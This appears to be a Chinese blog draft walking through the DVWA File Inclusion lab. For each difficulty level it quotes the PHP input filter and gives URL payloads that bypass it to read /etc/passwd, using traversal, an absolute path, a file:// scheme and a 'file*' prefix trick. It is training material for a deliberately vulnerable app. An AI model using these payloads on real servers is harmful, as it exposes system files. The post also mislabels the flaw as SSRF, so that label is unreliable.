---
title: "File_inclusion"
date: 2020-04-13T11:16:14+08:00
tags: ["penetration test"]
draft: true
---

DVWA File Inclusion 过关秘籍

是一种`SSRF`漏洞

### Low

```PHP
// 非常单纯, 随便读取
// http://192.168.32.114/vulnerabilities/fi/?page=../../../../../../etc/passwd
// The page we wish to display
$file = $_GET[ 'page' ];
```

### Medium

```PHP
// The page we wish to display
$file = $_GET[ 'page' ];

// 过滤一部分字符
// 不允许 HTTP,HTTPS 协议
// 利用目录结构读取也不行

// 然而没有过滤全
// http://192.168.32.114/vulnerabilities/fi/?page=/etc/passwd

// Input validation
$file = str_replace( array( "http://", "https://" ), "", $file );
$file = str_replace( array( "../", "..\"" ), "", $file );
```

### High

```PHP
// The page we wish to display
$file = $_GET[ 'page' ];

// Input validation
// 对$file 字符串做匹配
// 只能匹配 file* 的文件路径
// 还有 include.php 文件路径

// 这个过滤还是八星
// 利用`本地文件传输协议`
// http://192.168.32.114/vulnerabilities/fi/?page=file:///etc/passwd

// 或者这样
// http://192.168.32.114/vulnerabilities/fi/?page=file123123/../../../../../../etc/passwd

if( !fnmatch( "file*", $file ) && $file != "include.php" ) {
    // This isn't the page we want!
    echo "ERROR: File not found!";
    exit;
}
```

### Impossible

```PHP
// The page we wish to display
$file = $_GET[ 'page' ];

// Only allow include.php or file{1..3}.php
// 强匹配
// 从程序员的角度来说这种代码的维护性极差
// 从安全的角度上来说这是最安全的方案
if( $file != "include.php" && $file != "file1.php" && $file != "file2.php" && $file != "file3.php" ) {
    // This isn't the page we want!
    echo "ERROR: File not found!";
    exit;
}
```